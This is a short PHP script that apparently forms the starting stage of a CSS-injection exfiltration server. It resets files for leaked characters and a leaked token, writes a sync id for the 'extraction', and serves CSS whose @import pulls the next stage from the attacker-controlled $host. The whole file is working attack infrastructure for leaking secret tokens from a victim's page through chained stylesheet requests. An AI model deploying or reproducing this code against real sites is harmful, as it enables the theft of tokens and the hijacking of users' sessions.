<?php 
    header("Content-Type: text/css"); 
    require('config.php');
    
    // Clean leak chars file
    $preCharsFile = 'pre.txt';
    if(file_exists($preCharsFile)) {
        unlink($preCharsFile);  
    }

    // Clean leak chars file
    $postCharsFile = 'post.txt';
    if(file_exists($postCharsFile)) {
        unlink($postCharsFile);  
    }

    // Clean token file
    $leakTokenFile = 'leakToken.txt';
    if(file_exists($leakTokenFile)) {
        unlink($leakTokenFile);  
    }

    // Generate a random sync id
    // needed when extraction goes wrong
    $syncIdFile = 'sync-id.txt';
    file_put_contents($syncIdFile, md5(openssl_random_pseudo_bytes(20)));

    echo '
        @import url(' . $host . 'next.php?len=0);
    ';
?>  